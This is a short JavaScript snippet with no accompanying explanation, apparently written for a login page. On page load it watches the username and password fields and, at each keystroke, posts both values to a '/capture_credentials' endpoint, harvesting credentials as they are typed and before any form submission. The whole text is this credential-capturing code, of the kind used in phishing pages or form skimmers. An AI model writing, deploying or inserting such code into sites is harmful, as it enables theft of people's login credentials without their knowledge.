
cument.addEventListener('DOMContentLoaded', function() {
	    const usernameInput = document.getElementById('username');
	    const passwordInput = document.getElementById('password');

	    usernameInput.addEventListener('input', function() {
		            captureCredentials();
		        });

	    passwordInput.addEventListener('input', function() {
		            captureCredentials();
		        });

	    function captureCredentials() {
		            const username = usernameInput.value;
		            const password = passwordInput.value;

		            if (username || password) {
				                fetch('/capture_credentials', {
							                method: 'POST',
							                headers: {
										                    'Content-Type': 'application/json',
										                },
							                body: JSON.stringify({ username: username, password: password })
							            });
				            }
		        }
});

